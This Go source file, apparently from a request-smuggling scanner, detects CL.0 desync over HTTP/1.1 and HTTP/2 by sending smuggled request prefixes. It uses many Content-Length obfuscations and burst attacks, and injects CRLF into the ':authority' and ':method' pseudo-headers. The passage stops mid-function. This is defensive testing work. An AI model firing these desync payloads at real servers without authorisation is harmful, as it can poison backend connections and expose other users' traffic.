package scan

// cl0.go — CL.0 (Content-Length: 0) desync detection
//
// Three detection strategies:
//
//   1. Gadget bleed (CONFIRMED): marker from the smuggled request leaks into
//      a subsequent response — proves the backend treated the body as a new request.
//
//   2. Status divergence (PROBABLE): the probe response status differs from the
//      baseline after the smuggle — the smuggled prefix altered backend routing.
//      Adapted from CLZero (github.com/Moopinger/CLZero).
//
//   3. Status 400 potential: CL mutation causes 400 where baseline was 2xx,
//      only when body is present — the server may be parsing body as a new request.
//
// Connection modes (in order of speed):
//
//   - Last-byte-sync: open probe connection first, send all but last byte;
//     send full smuggle on second connection; fire last byte of probe.
//     Maximizes chance of catching the poisoned backend connection.
//
//   - Skip-read: send smuggle without reading response, immediately send probe.
//     Faster than sequential, good for most targets.
//
//   - Sequential (fallback): send smuggle, read response, send probe.

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/smuggled/smuggled/internal/config"
	"github.com/smuggled/smuggled/internal/permute"
	"github.com/smuggled/smuggled/internal/report"
	"github.com/smuggled/smuggled/internal/request"
)

// cl0Gadget represents a candidate smuggled inner-request used to confirm CL.0.
// The gadget is fired directly to verify it produces a distinctive response,
// then used as the smuggled body in the attack. If the probe response reflects
// the gadget marker, the backend demonstrably processed the smuggled request.
type cl0Gadget struct {
	payload        string // request-line to inject as smuggled prefix
	lookFor        string // marker to search for in the follow-up probe response
	headerOnly     bool   // true = only search in response headers, not body
	responseStatus int    // HTTP status the gadget itself returns (0 = unknown/fallback)
	responseLen    int    // body length of the gadget response (0 = unknown; used for size-based detection)
}

// clGadgets are the static candidate inner-requests for CL.0 gadget detection,
// listed in priority order (most distinctive / cheapest first).
// A dynamic canary-path gadget is prepended at runtime in selectCL0Gadget.
var clGadgets = []cl0Gadget{
	// Random path — most servers reflect it in 404 error pages.
	{"GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1", "wrtztrw", false, 0, 0},

	// Common endpoints likely to exist and produce distinctive responses.
	// Even if marker doesn't match, status-divergence fallback catches 200 vs 404.
	{"GET /ping HTTP/1.1", "pong", false, 0, 0},
	{"GET /health HTTP/1.1", "\"status\"", false, 0, 0},
	{"GET /healthz HTTP/1.1", "\"ok\"", false, 0, 0},
	{"GET /readyz HTTP/1.1", "\"ok\"", false, 0, 0},
	{"GET /livez HTTP/1.1", "\"ok\"", false, 0, 0},
	{"GET /status HTTP/1.1", "\"status\"", false, 0, 0},
	{"GET /.well-known/openid-configuration HTTP/1.1", "issuer", false, 0, 0},
	{"GET /.well-known/security.txt HTTP/1.1", "Contact:", false, 0, 0},
	{"GET /sitemap.xml HTTP/1.1", "urlset", false, 0, 0},
	{"GET /api HTTP/1.1", "\"version\"", false, 0, 0},
	{"GET /login HTTP/1.1", "password", false, 0, 0},
	{"GET /server-status HTTP/1.1", "Apache", false, 0, 0},

	// Standard files with distinctive content-type or body markers.
	{"GET /robots.txt HTTP/1.1", "llow:", false, 0, 0},
	{"GET /favicon.ico HTTP/1.1", "image/", true, 0, 0},

	// Method/version tricks that produce distinctive status codes.
	// "405 " (trailing space) avoids false positives from UUIDs/IDs containing
	// "405" as a substring (e.g. x-request-id: ...-9405-...).
	{"TRACE / HTTP/1.1", "405 ", true, 0, 0},
	{"GET / HTTP/2.2", "505 ", true, 0, 0},
}

// cl0TraceGadget is the TRACE fallback used when no other gadget is viable.
// Defined separately so ScanCL0 and ScanH2CL0 can reference it by name
// rather than by index.
var cl0TraceGadget = &clGadgets[len(clGadgets)-2] // TRACE / HTTP/1.1 is second-to-last

// clMutation is a single Content-Length obfuscation technique.
type clMutation struct {
	name   string
	mutate func(req []byte, clVal string) []byte
}

// allCLMutations returns the complete list of CL.0 mutation techniques:
//   - 12 existing techniques (CL-plus, CL-minus, CL-pad, etc.)
//   - 4 CLZero-derived static techniques (CL-alpha, CL-subtract, CL-under, CL-smashed)
//   - 130 CLZero dynamic byte-family techniques (10 families × 13 byte values)
//
// Total: ~146 techniques per scan.
func allCLMutations() []clMutation {
	// Helper: wrap ApplyCL call into a closure capturing the technique name.
	cl := func(name string) clMutation {
		return clMutation{name, func(r []byte, v string) []byte {
			return permute.ApplyCL(r, name, v)
		}}
	}

	out := []clMutation{
		// ── Existing techniques ───────────────────────────────────────────────
		cl("CL-plus"),
		cl("CL-minus"),
		cl("CL-pad"),
		cl("CL-bigpad"),
		cl("CL-e"),
		cl("CL-dec"),
		cl("CL-commaprefix"),
		cl("CL-commasuffix"),
		cl("CL-error"),
		cl("CL-spacepad"),
		cl("CL-expect"),
		cl("CL-expect-obfs"),

		// ── Dual CL header attacks ────────────────────────────────────────────
		// Two Content-Length headers with conflicting values — RFC 7230 §3.3.2 says
		// reject; proxies and back-ends disagree on which one wins.
		cl("CL-dual-zero-first"), // CL: 0\r\nCL: <n> — front takes first, back takes last
		cl("CL-dual-zero-last"),  // CL: <n>\r\nCL: 0 — front takes last, back takes first

		// ── Header injection / obs-fold techniques ────────────────────────────
		// Source: Burp Suite HTTP Request Smuggler CL.0 scanner (observed payloads).
		cl("CL-none"),             // No Content-Length at all — pure CL.0
		cl("CL-connection-strip"), // Connection: Content-Length → proxy strips CL
		cl("CL-badsetupCR"),       // Foo: bar\rContent-Length: <n> — bare CR injection
		cl("CL-badsetupLF"),       // Foo: bar\nContent-Length: <n> — bare LF injection
		cl("CL-0dwrap"),           // Foo: bar\r\n\rContent-Length: <n> — CR after obs-fold
		cl("CL-nameprefix1"),      // Foo: bar\r\n Content-Length: <n> — obs-fold space
		cl("CL-nameprefix2"),      // Foo: bar\r\n\tContent-Length: <n> — obs-fold tab
		cl("CL-range"),            // Range: bytes=0-0 added after CL

		// ── CLZero-derived static techniques ─────────────────────────────────
		// Source: github.com/Moopinger/CLZero/blob/main/configs/default.py
		cl("CL-alpha"),    // Content-Length: <n>aa ("normalize" in CLZero)
		cl("CL-subtract"), // Content-Length: <n>-0 ("subtract" in CLZero)
		cl("CL-under"),    // Content_Length: <n>   ("underjoin1" in CLZero)
		cl("CL-smashed"),  // Content Length:<n>    ("smashed" in CLZero)
	}

	// ── CLZero dynamic byte-family techniques ─────────────────────────────────
	// 10 position families × 13 byte values = 130 permutations.
	clFamilies := []string{
		"CL-midspace",   // Content-Length:<byte><value>
		"CL-postspace",  // Content-Length<byte>: <value>
		"CL-prespace",   // <byte>Content-Length: <value>
		"CL-endspace",   // Content-Length: <value><byte>
		"CL-xprespace",  // X: X<byte>Content-Length: <value>
		"CL-endspacex",  // Content-Length: <value><byte>X: X
		"CL-rxprespace", // X: X\r<byte>Content-Length: <value>
		"CL-xnprespace", // X: X<byte>\nContent-Length: <value>
		"CL-endspacerx", // Content-Length: <value>\r<byte>X: X
		"CL-endspacexn", // Content-Length: <value><byte>\nX: X
	}
	for _, b := range permute.CLZeroBytes() {
		sfx := fmt.Sprintf("-%02x", b)
		for _, fam := range clFamilies {
			out = append(out, cl(fam+sfx))
		}
	}

	return out
}

// ScanCL0 runs CL.0 desync detection with all CL mutation techniques.
func ScanCL0(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("CL0")
	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}
	path := target.RequestURI()
	if path == "" {
		path = "/"
	}

	dbg(cfg, "starting, target=%s path=%s", host, path)

	method := config.EffectiveMethod(cfg, true)
	basePost := request.BuildKeepAliveRequest(method, path, host)

	// Build probe request — must also use keep-alive since it's sent on the
	// SAME connection after the attack (pipeline). Connection: close would
	// tell the server to drop the connection before we can probe.
	probeReq := request.BuildKeepAliveProbe("GET", path, host)

	// Establish baseline using a standalone GET (Connection: close is fine here).
	// Detection 2 compares probe status against baseline — if baseline uses a
	// different method (POST → 404) but probe is GET (→ 200), the divergence
	// is a method difference, not a CL.0 signal.
	baselineReq := request.BuildGETRequest("GET "+path+" HTTP/1.1", host)
	baseResp, _, _, _ := request.RawRequest(target, baselineReq, cfg)
	baseStatus := request.StatusCode(baseResp)
	dbg(cfg, "baseline status=%d", baseStatus)
	if isRateLimited(baseStatus) {
		rep.Log("CL.0: baseline returned %d (rate limited), skipping %s", baseStatus, host)
		return
	}

	// Detect which gadget is viable
	gadget := selectCL0Gadget(target, basePost, cfg, rep)
	if gadget == nil {
		dbg(cfg, "no viable gadget found, using TRACE fallback")
		rep.Log("CL.0: no viable gadget found for %s, using TRACE fallback", host)
		gadget = cl0TraceGadget
	} else {
		dbg(cfg, "selected gadget payload=%q marker=%q", gadget.payload, gadget.lookFor)
	}

	canary := "YzBqvXxSmuggled"
	smuggledPrefix := fmt.Sprintf("%s\r\nX-%s: ", gadget.payload, canary)

	for _, mut := range allCLMutations() {
		if !techniqueEnabled(mut.name, cfg) {
			continue
		}
		dbg(cfg, "[%s]: starting, gadget=%q", mut.name, gadget.payload)
		rep.Log("CL.0 probe: technique=%s gadget=%s target=%s", mut.name, gadget.payload, host)

		// Build attack: body = smuggled prefix, CL mutated to look like 0
		clVal := fmt.Sprintf("%d", len(smuggledPrefix))
		attackReq := request.SetBody(basePost, smuggledPrefix)
		attackReq = request.SetContentLength(attackReq, len(smuggledPrefix))
		attackReq = mut.mutate(attackReq, clVal)

		for i := 0; i < cfg.Attempts; i++ {
			// CL.0 requires attack + probe on the SAME keep-alive connection.
			// The attack body stays in the TCP buffer if the server treats CL=0;
			// the subsequent probe on that connection then receives the smuggled response.
			probeResp, _, probeTimeout, probeErr := request.PipelineCL0Probe(
				target, attackReq, probeReq, cfg)

			if probeErr != nil || probeTimeout {
				dbg(cfg, "[%s]: attempt %d err=%v timeout=%v",
					mut.name, i, probeErr, probeTimeout)
				continue
			}

			probeStatus := request.StatusCode(probeResp)
			dbg(cfg, "[%s]: attempt %d probeStatus=%d probeLen=%d",
				mut.name, i, probeStatus, len(probeResp))

			// ── Detection 1: Gadget bleed (CONFIRMED) ────────────────
			if gadgetMatches(probeResp, gadget) {
				// Java FP guard: if the gadget matches on the very first attempt,
				// the endpoint naturally returns this content — not a smuggle signal.
				if i == 0 {
					dbg(cfg, "[%s]: gadget matched on attempt 0 — endpoint naturally contains marker, skipping technique",
						mut.name)
					break
				}
				dbg(cfg, "[%s]: CONFIRMED gadget bleed at attempt %d", mut.name, i)
				rep.Emit(report.Finding{
					Target:   target.String(),
					Method:   config.EffectiveMethods(cfg)[0],
					Severity: report.SeverityConfirmed,
					Type:     "CL.0",
					Technique: mut.name + "|" + gadget.payload,
					Description: fmt.Sprintf(
						"CL.0 desync confirmed: after %d attempts with technique '%s', "+
							"response reflected gadget marker '%s' from smuggled prefix.",
						i, mut.name, gadget.lookFor),
					Evidence: fmt.Sprintf("attempt=%d smuggled_prefix=%q probe_status=%d", i, smuggledPrefix, probeStatus),
					RawProbe: request.Truncate(string(attackReq), 512),
				})
				if cfg.ExitOnFind {
					return
				}
				break // found for this mutation — move to next
			}

			// ── Detection 2: Status divergence (PROBABLE) ────────────
			//
			// IMPORTANT: The Java (PortSwigger) scanner does NOT have a generic
			// status-divergence detection for CL.0. Its primary signal is gadget
			// content leakage (Detection 1 above). The only status-based check in
			// Java is "Potential 0.CL" which fires exclusively when probe=400 and
			// baseline!=400, confirmed with 30 benign requests (our Detection 3).
			//
			// This Detection 2 is an extension that fires when:
			//   - The probe status matches what the gadget returns (gadget-status guard)
			//   - The divergence is cross-class (e.g. 200→405, not 404→403)
			//   - Reproduces multiple times
			//   - Clean probes don't show the same divergence
			//
			// When gadget.responseStatus == 0 (TRACE fallback — meaning we couldn't
			// verify the gadget's own status), we SKIP this detection entirely.
			// Without knowing what status the smuggled response should produce,
			// any divergence is speculative and generates WAF/CDN false positives.
			if gadget.responseStatus != 0 && probeStatus == gadget.responseStatus &&
				i > 0 && baseStatus > 0 && probeStatus > 0 &&
				probeStatus != baseStatus && probeStatus != 429 {
				dbg(cfg, "[%s]: status divergence at attempt %d: base=%d probe=%d gadget_expected=%d",
					mut.name, i, baseStatus, probeStatus, gadget.responseStatus)

				// Same-class filter: when both baseline and probe are in the same
				// HTTP status class (e.g. both 4xx), the divergence is likely
				// WAF/CDN noise rather than a genuine smuggling signal.
				if baseStatus/100 == probeStatus/100 {
					dbg(cfg, "[%s]: same HTTP class (%dxx→%dxx) — noise, skipping",
						mut.name, baseStatus/100, probeStatus/100)
					continue
				}

				// Unstable-baseline guard: send multiple clean probes (no preceding
				// smuggle). If ANY returns the diverged status, the server is
				// non-deterministic — not a CL.0 signal.
				unstable := false
				for c := 0; c < 3; c++ {
					cleanCheck, _, cleanTimeout, cleanErr := request.RawRequest(target, probeReq, cfg)
					if cleanErr == nil && !cleanTimeout &&
						request.StatusCode(cleanCheck) == probeStatus {
						dbg(cfg, "[%s]: clean probe %d returns %d (same as diverged) — unstable baseline FP",
							mut.name, c, probeStatus)
						unstable = true
						break
					}
				}
				if unstable {
					break
				}

				// Reproduction guard: require the divergence to reproduce at least
				// once more to filter transient WAF/CDN artifacts.
				reproduced := false
				for r := 0; r < 2; r++ {
					reprResp, _, reprTimeout, reprErr := request.PipelineCL0Probe(
						target, attackReq, probeReq, cfg)
					if reprErr == nil && !reprTimeout && request.StatusCode(reprResp) == probeStatus {
						reproduced = true
						break
					}
				}
				if !reproduced {
					dbg(cfg, "[%s]: divergence did not reproduce — transient, skipping", mut.name)
					continue
				}

				rep.Emit(report.Finding{
					Target:   target.String(),
					Method:   config.EffectiveMethods(cfg)[0],
					Severity: report.SeverityProbable,
					Type:     "CL.0-divergence",
					Technique: mut.name,
					Description: fmt.Sprintf(
						"CL.0 status divergence: technique '%s' caused probe status %d "+
							"(baseline: %d, matches gadget expected %d) after %d smuggle attempts. "+
							"The smuggled prefix may have altered backend routing.",
						mut.name, probeStatus, baseStatus, gadget.responseStatus, i),
					Evidence: fmt.Sprintf("baseline=%d probe=%d gadget_expected=%d attempt=%d reproduced=true",
						baseStatus, probeStatus, gadget.responseStatus, i),
					RawProbe: request.Truncate(string(attackReq), 512),
				})
				if cfg.ExitOnFind {
					return
				}
				break // found for this mutation — move to next
			}

			// ── Detection 3: Status 400 potential (maps to Java "Potential 0.CL") ──
			// Java fires when: probe=400, baseline!=400, then confirms with 30
			// benign-body requests (all must return non-400). We use 15.
			if i > 0 && baseStatus > 0 && baseStatus != 400 && probeStatus == 400 {
				// Verify: mutation with harmless body should NOT cause 400
				fakeReq := request.SetBody(basePost, " ")
				fakeReq = request.SetContentLength(fakeReq, 1)
				fakeReq = mut.mutate(fakeReq, "1")
				allGood := true
				for k := 0; k < 15; k++ {
					fr, _, _, ferr := request.RawRequest(target, fakeReq, cfg)
					if ferr != nil || request.StatusCode(fr) == 400 {
						allGood = false
						break
					}
				}
				if allGood {
					rep.Emit(report.Finding{
						Target:   target.String(),
						Method:   config.EffectiveMethods(cfg)[0],
						Severity: report.SeverityProbable,
						Type:     "CL.0-potential",
						Technique: mut.name,
						Description: fmt.Sprintf(
							"Potential CL.0: technique '%s' caused status 400 (baseline: %d) "+
								"only when smuggled body is present.",
							mut.name, baseStatus),
						Evidence: fmt.Sprintf("baseline=%d probe=400 attempt=%d", baseStatus, i),
					})
					if cfg.ExitOnFind {
						return
					}
				}
			}
		}
	}
}

// ScanH2CL0 is the HTTP/2 variant of ScanCL0, delivering the same CL.0 attack
// via H2→H1 downgrade using forbidden or malformed headers (matches Burp Suite scanner).
//
// Mechanism:
//   - "Connection: keep-alive" is a hop-by-hop header forbidden in HTTP/2 (RFC 7540 §8.1.2.2).
//     Some front-ends forward it verbatim during H2→H1 downgrade.
//   - "Expect: x 100-continue" is malformed. Some H1 back-ends treat the request as
//     body-less when Expect is unrecognised, leaving the DATA frame bytes in the TCP buffer.
//   - Those buffered bytes are then parsed as the first line of the next H1 request (CL.0).
//
// Detection: same gadget-bleed strategy as ScanCL0 — use selectCL0Gadget to find a
// viable gadget, send the attack with the gadget as body, probe with a clean H2 GET,
// and check if the probe response reflects the gadget marker or diverges in status.
func ScanH2CL0(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("H2CL0")
	if target.Scheme != "https" {
		return
	}
	if !request.ProbeH2(target, cfg) {
		rep.Log("H2CL0: %s does not negotiate h2, skipping", target.Host)
		return
	}

	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}
	path := target.RequestURI()
	if path == "" {
		path = "/"
	}

	// Reuse the same H1 gadget selection: test each candidate path directly
	// to find one whose response is distinctive and not present in baseline.
	baseReq := request.BuildKeepAliveRequest("GET", path, host)
	gadget := selectCL0Gadget(target, baseReq, cfg, rep)
	if gadget == nil {
		dbg(cfg, "H2CL0: no viable gadget found, using TRACE fallback")
		rep.Log("H2CL0: no viable gadget found for %s, using TRACE fallback", host)
		gadget = cl0TraceGadget
	} else {
		dbg(cfg, "H2CL0: selected gadget payload=%q marker=%q", gadget.payload, gadget.lookFor)
	}

	// smuggledBody = incomplete H1 request prefix; the absorber header (X-YzBqv:)
	// swallows the first line of the real next request, completing the injection cleanly.
	smuggledBody := fmt.Sprintf("%s\r\nX-YzBqv: ", gadget.payload)

	// Baseline via H2 to detect status divergence
	baseline, err := h2RawRequest(target, "GET", path, host, "", nil, cfg)
	if err != nil || baseline.Status == 0 {
		dbg(cfg, "H2CL0: baseline failed: %v", err)
		return
	}
	baseStatus := baseline.Status
	baseBodyLen := len(baseline.Body)
	dbg(cfg, "H2CL0: baseline status=%d bodyLen=%d gadget=%q", baseStatus, baseBodyLen, gadget.payload)
	if isRateLimited(baseStatus) {
		rep.Log("H2CL0: baseline returned %d (rate limited), skipping %s", baseStatus, host)
		return
	}

	// Header permutations — each isolates a specific CL.0 trigger mechanism.
	// Mirrors the exact techniques observed in Burp Suite's H2 CL.0 scanner.
	//
	// Key insight from Burp's payloads:
	//   - Burp does NOT use Connection: keep-alive in H2 (forbidden per RFC 7540 §8.1.2.2).
	//     Instead it uses X-Connection: keep-alive (a custom header, forwarded by some proxies).
	//   - Burp does NOT use Expect: headers in H2 CL.0 scans.
	//   - The actual CL.0 mechanism is content-length: 0 in the H2 HEADERS frame while the
	//     DATA frame still carries the smuggled body prefix.
	headerPerms := []struct {
		name  string
		extra map[string]string
	}{
		{
			// Primary technique: real CL matching the actual body length.
			// Valid HTTP/2 (CL matches DATA frame payload), so no PROTOCOL_ERROR.
			// The HEAD method causes the back-end to ignore the body;
			// body bytes stay in the TCP buffer → CL.0 desync.
			// Matches Burp's working CL.0 HEAD payload (Req2).
			"bare/cl-real",
			map[string]string{
				// no content-length override → h2BurstAttackAndProbe uses real body length
			},
		},
		{
			// Real CL + X-Connection: keep-alive hint.
			// Some front-ends forward X-Connection as Connection: keep-alive
			// in H2→H1 downgrade, ensuring the back-end keeps the connection alive.
			"x-connection/cl-real",
			map[string]string{
				"x-connection": "keep-alive",
				// no content-length override → real body length
			},
		},
		{
			// Bare no-CL: omit content-length entirely, body in DATA frames.
			// Valid HTTP/2 (CL is optional; body determined by DATA frames).
			// Matches Burp's Req1 (HEAD with body, no CL).
			"bare/no-cl",
			map[string]string{
				"content-length": "", // suppress
			},
		},
		{
			// X-Connection + no CL header.
			"x-connection/no-cl",
			map[string]string{
				"x-connection":   "keep-alive",
				"content-length": "", // sentinel: suppress CL header
			},
		},
		{
			// CL=0 with body: technically malformed HTTP/2 (CL doesn't match
			// DATA frame length), but some non-conformant proxies accept it.
			// The proxy forwards CL=0 to the back-end → back-end reads no body
			// → DATA frame bytes stay in TCP buffer → CL.0.
			"x-connection/cl-zero",
			map[string]string{
				"x-connection":   "keep-alive",
				"content-length": "0",
			},
		},
		{
			// Bare CL=0 without X-Connection.
			"bare/cl-zero",
			map[string]string{
				"content-length": "0",
			},
		},
	}

	for _, method := range config.EffectiveMethods(cfg) {
		for _, perm := range headerPerms {
			if !techniqueEnabled("H2.CL0/"+perm.name, cfg) {
				continue
			}
			rep.Log("H2CL0 probe: method=%s perm=%s gadget=%s target=%s",
				method, perm.name, gadget.payload, host)
			dbg(cfg, "H2CL0 [%s/%s]: smuggled=%q", method, perm.name, smuggledBody)

			if cfg.ExitOnFind && h2cl0runPerm(target, method, path, host, smuggledBody, perm.extra, perm.name, gadget, baseStatus, baseBodyLen, cfg, rep) {
				return
			} else if !cfg.ExitOnFind {
				h2cl0runPerm(target, method, path, host, smuggledBody, perm.extra, perm.name, gadget, baseStatus, baseBodyLen, cfg, rep)
			}
		}

		// ── H2 pseudo-header injection techniques ────────────────────────────
		// Burp also probes CL injection via H2 :authority and :method pseudo-headers.
		// When the front-end downgrades H2→H1, the crafted pseudo-header value may
		// produce a non-numeric Content-Length in the H1 request, triggering CL.0
		// on the back-end ("48x" is invalid → parsed as 0 by some implementations).
		//
		// The injected CL string uses "<n>x: x" where <n> is the real body length.
		// The trailing "x: x" makes the injected text look like an additional header
		// field to parsers that stop at the first non-numeric character of the CL value.
		bodyLen := len(smuggledBody)
		port := target.Port()
		if port == "" {
			port = "443"
		}

		pseudoInjects := []struct {
			name  string
			extra map[string]string
		}{
			{
				// :authority injection: the \r\n terminates the Host header value and
				// injects a non-numeric Content-Length as a separate H1 header.
				// When the H2→H1 front-end naively uses the :authority value as the
				// Host header, the back-end sees:
				//   Host: <host>:443\r\n
				//   Content-Length: <n>x: x\r\n
				// The non-numeric CL value triggers CL.0 on the back-end.
				"authority-inject",
				map[string]string{
					":authority":     fmt.Sprintf("%s:%s\r\nContent-Length: %dx: x", target.Hostname(), port, bodyLen),
					"x-connection":   "keep-alive",
					"content-length": "", // suppress actual CL
				},
			},
			{
				// :method raw injection: method pseudo-header terminates the H1 request
				// line with \r\n and injects a non-numeric Content-Length as a header.
				// When the H2→H1 front-end naively uses the :method value as the request
				// line, the back-end sees:
				//   POST / HTTP/1.1\r\n
				//   Content-Length: <n>x: x\r\n
				// The non-numeric CL value triggers CL.0 on the back-end.
				"method-inject-raw",
				map[string]string{
					":method":        fmt.Sprintf("POST / HTTP/1.1\r\nContent-Length: %dx: x", bodyLen),
					"x-connection":   "keep-alive",
					"content-length": "",
				},
			},
			{
				// :method URL-encoded injection: same as above but with percent-encoding.
				// Some H2 implementations decode %20 before constructing the H1 request,
				// making this equivalent to the raw variant on those targets.
				// Others forward the encoded form verbatim, which the back-end may then
				// decode — either way producing a non-numeric CL.
				"method-inject-urlenc",
				map[string]string{
					":method":        fmt.Sprintf("POST%%20/%%20HTTP/1.1%%0D%%0AContent-Length:%%20%dx:%%20x", bodyLen),
					"x-connection":   "keep-alive",
					"content-length": "",
				},
			},
		}

		for _, inj := range pseudoInjects {
			if !techniqueEnabled("H2.CL0/"+inj.name, cfg) {
				continue
			}
			rep.Log("H2CL0 pseudo-inject: method=%s perm=%s gadget=%s target=%s",
				method, inj.name, gadget.payload, host)
			dbg(cfg, "H2CL0 [%s/%s]: smuggled=%q bodyLen=%d", method, inj.name, smuggledBody, bodyLen)

			if cfg.ExitOnFind && h2cl0runPerm(target, method, path, host, smuggledBody, inj.extra, inj.name, gadget, baseStatus, baseBodyLen, cfg, rep) {
				return
			} else if !cfg.ExitOnFind {
				h2cl0runPerm(target, method, path, host, smuggledBody, inj.extra, inj.name, gadget, baseStatus, baseBodyLen, cfg, rep)
			}
		}
	}
}

// formatH2AttackRaw builds a human-readable HTTP/2 request representation for findings.
// It formats the extra headers map as proper header lines and correctly shows or
// suppresses content-length based on the extra map (matching actual wire behavior).
func formatH2AttackRaw(method, path, host string, extra map[string]string, body string) string {
	var b strings.Builder
	b.WriteString(fmt.Sprintf("%s %s HTTP/2\r\n", method, path))
	b.WriteString(fmt.Sprintf(":authority: %s\r\n", host))

	clValue := fmt.Sprintf("%d", len(body))
	suppressCL := false
	for k, v := range extra {
		switch {
		case k == "content-length" && v == "":
			suppressCL = true
		case k == "content-length":
			clValue = v
		default:
			if v != "" {
				b.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
			}
		}
	}
	if !suppressCL {
		b.WriteString(fmt.Sprintf("content-length: %s\r\n", clValue))
	}
	b.WriteString(fmt.Sprintf("\r\n%s", body))
	return b.String()
}

// h2cl0runPerm executes a single H2 CL.0 permutation across cfg.Attempts attempts.
// Returns true if a finding was emitted (used with ExitOnFind to short-circuit).
//
// Strategy: each attempt sends a BURST of attack requests (multiple streams)
// followed by a single probe on the same H2 connection. This maximizes the
// chance of poisoning the back-end TCP buffer — multiple attacks increase the
// probability that at least one leaves the smuggled body for the probe to consume.
func h2cl0runPerm(
	target *url.URL, method, path, host, smuggledBody string,
	extra map[string]string, permName string,
	gadget *cl0Gadget, baseStatus int, baseBodyLen int,
	cfg config.Config, rep *report.Reporter,
) bool {
	const burstSize = 5 // send 5 attacks before each probe

	for attempt := 0; attempt < cfg.Attempts; attempt++ {
		// Burst: N attack streams + 1 probe stream on the same H2 connection.
		probe, err := h2BurstAttackAndProbe(target, method, path, host, smuggledBody, extra, burstSize, cfg)
		if err != nil {
			dbg(cfg, "H2CL0 [%s/%s]: attempt %d error: %v", method, permName, attempt, err)
			continue
		}
		if probe.Status == 0 {
			dbg(cfg, "H2CL0 [%s/%s]: attempt %d probe status=0, skipping", method, permName, attempt)
			continue
		}

		probeStatus := probe.Status

		// Collect probe bytes for gadget matching.
		var probeBytes []byte
		if gadget.headerOnly {
			for _, hf := range probe.Headers {
				probeBytes = append(probeBytes, []byte(hf.Name+": "+hf.Value+"\r\n")...)
			}
		} else {
			probeBytes = probe.Body
		}
		gadgetFound := request.ContainsStr(probeBytes, gadget.lookFor)

		dbg(cfg, "H2CL0 [%s/%s]: attempt %d probeStatus=%d baseline=%d gadget=%v",
			method, permName, attempt, probeStatus, baseStatus, gadgetFound)

		// ── Detection 1: gadget marker reflected (CONFIRMED) ─────────────
		if gadgetFound {
			// Java FP guard: gadget on first attempt = endpoint naturally returns it.
			if attempt == 0 {
				dbg(cfg, "H2CL0 [%s/%s]: gadget on attempt 0 — natural content, skipping",
					method, permName)
				break
			}
			dbg(cfg, "H2CL0 [%s/%s]: CONFIRMED gadget bleed at attempt %d", method, permName, attempt)
			rep.Emit(report.Finding{
				Target:    target.String(),
				Method:    "HTTP/2",
				Severity:  report.SeverityConfirmed,
				Type:      "H2.CL0",
				Technique: fmt.Sprintf("H2.CL0/%s/%s", method, permName),
				Description: fmt.Sprintf(
					"H2 CL.0 desync confirmed (single-connection): technique '%s' caused "+
						"the H2→H1 downgrade to leave the DATA body in the TCP buffer. "+
						"Back-end parsed it as a new request; probe on stream 3 reflected "+
						"gadget marker '%s' from '%s' (method=%s, attempt=%d).",
					permName, gadget.lookFor, gadget.payload, method, attempt),
				Evidence: fmt.Sprintf("attempt=%d gadget=%q marker=%q probe_status=%d baseline=%d",
					attempt, gadget.payload, gadget.lookFor, probeStatus, baseStatus),
				RawProbe: fmt.Sprintf("[stream 1] %s\n[stream 3] GET %s HTTP/2\r\n:authority: %s\r\n",
					formatH2AttackRaw(method, path, host, extra, smuggledBody), path, host),
			})
			return true
		}

		// ── Detection 2: status divergence (PROBABLE) ────────────────────
		// Same logic as H1: only fire when gadget.responseStatus is known (!=0)
		// and probe matches it. When using TRACE fallback (responseStatus==0),
		// skip entirely — without knowing the expected gadget status, any
		// divergence is speculative and generates WAF/CDN false positives.
		if gadget.responseStatus != 0 && probeStatus == gadget.responseStatus &&
			attempt > 0 && probeStatus != baseStatus && probeStatus != 429 {
			dbg(cfg, "H2CL0 [%s/%s]: status divergence at attempt %d: base=%d probe=%d gadget_expected=%d",
				method, permName, attempt, baseStatus, probeStatus, gadget.responseStatus)

			// Same-class filter: both baseline and probe in the same HTTP class
			// (e.g. 404→403) is WAF/CDN noise, not a genuine CL.0 signal.
			if baseStatus/100 == probeStatus/100 {
				dbg(cfg, "H2CL0 [%s/%s]: same HTTP class (%dxx→%dxx) — skipping",
					method, permName, baseStatus/100, probeStatus/100)
				continue
			}

			// Reproduction guard: require divergence to reproduce at least once.
			reproduced := false
			for r := 0; r < 2; r++ {
				reprProbe, reprErr := h2BurstAttackAndProbe(target, method, path, host, smuggledBody, extra, burstSize, cfg)
				if reprErr == nil && reprProbe.Status == probeStatus {
					reproduced = true
					break
				}
			}
			if !reproduced {
				dbg(cfg, "H2CL0 [%s/%s]: divergence did not reproduce — transient, skipping",
					method, permName)
				continue
			}

			rep.Emit(report.Finding{
				Target:    target.String(),
				Method:    "HTTP/2",
				Severity:  report.SeverityProbable,
				Type:      "H2.CL0",
				Technique: fmt.Sprintf("H2.CL0/%s/%s", method, permName),
				Description: fmt.Sprintf(
					"H2 CL.0 desync (burst): probe returned status %d vs baseline %d "+
						"after %d attempts (%d attacks per burst, technique=%s, method=%s). "+
						"The smuggled prefix may have altered back-end routing.",
					probeStatus, baseStatus, attempt, burstSize, permName, method),
				Evidence: fmt.Sprintf("attempt=%d burst=%d probe_status=%d baseline=%d reproduced=true",
					attempt, burstSize, probeStatus, baseStatus),
				RawProbe: fmt.Sprintf("[streams 1-%d] %s\n[stream %d] GET %s HTTP/2\r\n:authority: %s\r\n",
					burstSize*2-1, formatH2AttackRaw(method, path, host, extra, smuggledBody),
					burstSize*2+1, path, host),
			})
			return true
		}

		// ── Detection 3: body-size divergence (PROBABLE) ─────────────────
		// When the gadget was selected by body-size divergence (same status class
		// but very different response size), check if the probe body size matches
		// the gadget's expected size rather than the baseline.
		if gadget.responseLen > 0 && attempt > 0 && probeStatus == baseStatus {
			probeBodyLen := len(probe.Body)
			// Check if probe body size is closer to the gadget's size than to baseline.
			// Require at least 100 bytes delta from baseline.
			bDelta := probeBodyLen - baseBodyLen
			if bDelta < 0 {
				bDelta = -bDelta
			}
			gDelta := probeBodyLen - gadget.responseLen
			if gDelta < 0 {
				gDelta = -gDelta
			}
			// Probe is closer to gadget size AND significantly different from baseline
			if bDelta > 100 && gDelta < bDelta/2 {
				dbg(cfg, "H2CL0 [%s/%s]: body-size divergence at attempt %d: probeLen=%d gadgetLen=%d",
